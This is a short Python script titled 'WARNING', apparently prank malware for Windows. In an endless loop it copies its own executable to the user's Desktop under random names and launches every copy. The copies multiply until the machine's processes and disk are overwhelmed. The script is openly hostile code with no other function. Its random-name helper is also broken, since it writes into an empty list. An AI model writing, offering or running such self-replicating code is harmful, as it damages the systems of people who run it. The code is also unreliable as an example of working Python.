#WARNING
import os,shutil,getpass,random

sl=[]
for i in range(65,122):
    sl.append(chr(i))
sl.remove('\\')

def randstr():
    sres=[]
    
    sres[0]=random.choice(sl)
    sres[1]=random.choice(sl)
    sres[2]=random.choice(sl)
    return ''.join(sres)

FILE_NAME="WARNING.py"

while True:
    rn=randstr()
    if os.path.basename(__file__)==FILE_NAME:
        cwd=os.getcwd()
    else:
        cwd='C:\\Users\\'+getpass.getuser()+'\\Desktop'
    if os.path.basename(__file__)==FILE_NAME:
        bname=FILE_NAME.split('.')[0]+'.exe'
    else:
        bname=os.path.basename(__file__)
    shutil.copyfile(cwd+'\\'+bname,'C:\\Users\\'+getpass.getuser()+'\\Desktop\\'+rn+'.exe')
    os.system('start C:\\Users\\'+getpass.getuser()+'\\Desktop\\'+rn+'.exe')